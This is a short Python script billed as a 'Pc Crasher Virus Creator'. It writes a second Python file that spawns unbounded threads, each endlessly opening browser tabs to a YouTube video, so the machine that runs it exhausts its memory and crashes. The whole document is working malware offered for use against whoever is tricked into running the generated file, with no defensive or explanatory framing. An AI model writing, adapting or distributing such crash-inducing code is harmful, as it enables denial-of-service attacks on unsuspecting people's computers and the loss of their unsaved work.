try:
    import os
    from os import system
    system("title " + "Ram Crasher Builder")
except:
    pass
print("Pc Crasher Virus Creator")
name = input("Enter What You Want The Name Of The File Should Be: ")
code = """
import threading, webbrowser
print('RIP')
def virus():
    while True:
        webbrowser.open_new_tab('https://www.youtube.com/watch?v=xvFZjo5PgG0&ab_channel=Duran')
        print('Opend Tab')
while True:
    threading.Thread(target=virus).start()
    print('Started Thread')
"""
try:
    file = open(name+".py", "a")
    file.write(code)
    file.close()
except:
    print("Unkown Error While Creating File")
    input("")
    exit()
print("Done Creating File")
input("")
exit()
